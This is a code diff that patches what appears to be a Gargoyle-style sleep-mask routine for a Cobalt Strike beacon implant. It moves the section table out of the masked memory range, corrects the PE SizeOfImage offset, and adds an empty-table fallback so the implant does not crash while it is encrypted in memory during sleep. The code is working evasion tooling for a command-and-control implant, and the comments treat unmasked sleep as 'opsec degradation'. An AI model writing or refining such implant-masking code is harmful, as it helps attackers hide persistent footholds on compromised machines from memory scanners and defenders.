@@ -20,7 +20,15 @@ GARGLEP * gparms = NULL;
  * exclusion for the mask function itself (the trampoline path executes
  * from our own .text and must never mask the code it is running). */
 DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
-	static DWORD own[70]; /* header pair + 16 sections, each split at most once */
+	/* The table MUST live OUTSIDE every masked range: the official sleepmask
+	 * BOF re-reads parms->sections on the unmask pass (mask_sections is
+	 * called a second time), so a table inside our own .data/.bss would be
+	 * XOR-scrambled by the mask pass and the unmask would walk garbage
+	 * ranges (random per-instance death, since the scramble key is the
+	 * random mask). The official beacon keeps its table in the settings
+	 * blob on the heap for the same reason. This page is never registered
+	 * with track_memory. */
+	static DWORD * own = NULL;
 	unsigned short lfanew, optsize, nsec;
 	unsigned int i, imgsz;
 	DWORD count = 1;
@@ -35,7 +43,13 @@ DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
 	memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
 	memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
 	memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
-	memcpy(&imgsz, gp->beacon_ptr + lfanew + 24 + 0x50, sizeof(imgsz));
+	/* PE32+: SizeOfImage is at optional-header offset 0x38. Reading 0x50
+	 * (DataDirectory[1].VirtualAddress) made imgsz the import-table RVA
+	 * (~0x1000), every section got filtered out by "va >= imgsz", and the
+	 * build silently failed back to the delivered official-layout table -
+	 * whose ranges cover our .pdata and fail-fast the process during the
+	 * masked window. */
+	memcpy(&imgsz, gp->beacon_ptr + lfanew + 24 + 0x38, sizeof(imgsz));
 	if (lfanew == 0 || lfanew >= 0x400 || optsize < 0xD0 || optsize >= 0x400 ||
 			nsec == 0 || nsec > 16 || imgsz == 0 || imgsz > 0x10000000)
 		return 0;
@@ -51,6 +65,12 @@ DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
 			xe = (unsigned int)(b - base);
 			have_excl = 1;
 		}
+	}
+
+	if (own == NULL) {
+		own = (DWORD *)VirtualAlloc(NULL, 256, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+		if (own == NULL)
+			return 0;
 	}
 
 	own[0] = 0;
@@ -97,8 +117,16 @@ DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
 			span = ve;
 		count++;
 	}
-	if (count <= 1)
+	if (count <= 1) {
+		/* parse failed: fall back to an EMPTY table, never to the delivered
+		 * official-layout table - its ranges cover our .pdata and fail-fast
+		 * the process during the masked window. An empty table means the
+		 * sleep is unmasked (opsec degradation), not a crash. */
+		own[0] = 0;
+		own[1] = 0;
+		gp->sections = own;
 		return 0;
+	}
 	own[count * 2] = 0;
 	own[count * 2 + 1] = 0;
 	gp->sections = own;
